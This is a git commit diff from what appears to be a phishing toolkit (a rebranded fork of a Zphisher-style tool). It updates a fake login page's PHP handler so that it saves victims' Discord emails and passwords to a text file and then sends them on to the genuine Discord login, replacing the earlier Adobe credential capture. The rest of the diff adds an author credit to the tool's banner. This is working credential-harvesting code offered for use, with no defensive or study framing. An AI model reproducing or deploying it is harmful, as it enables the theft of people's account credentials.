33cecb1dfafb15577e1417cafe166720c74e919c
yash <yashvyavahare02@gmail.com>
2023-06-09 00:31:17 +0530

    Updaing discord and other pages

--- .server/www/login.php
+++ .server/www/login.php
@@ -1,6 +1,5 @@
-<?php
-
-file_put_contents("usernames.txt", "Adobe Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://adobe.ly/2OE9ZKL');
+<?php 
+file_put_contents("usernames.txt", "Discord Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
+header('Location: https://discord.com/login');
 exit();
 ?>
--- yphisher.sh
+++ yphisher.sh
@@ -212,6 +212,7 @@ banner() {
 		${ORANGE}     |_|                                
 		${ORANGE}                                     
 		${ORANGE}                      ${RED}Version : ${__version__}
+		${ORANGE}                      ${RED}By : ${yashdon999}
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Yphisher (tahmid.rayat)${WHITE}
 	EOF
@@ -224,6 +225,7 @@ banner_small() {
 		${BLUE}  ░█░░░█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀█
 		${BLUE}  ░▀▀█▀▀░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
 		${BLUE}  ░░░█░░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+		${ORANGE}                      ${RED}By : ${Yashdon999}
 	EOF
 }
 
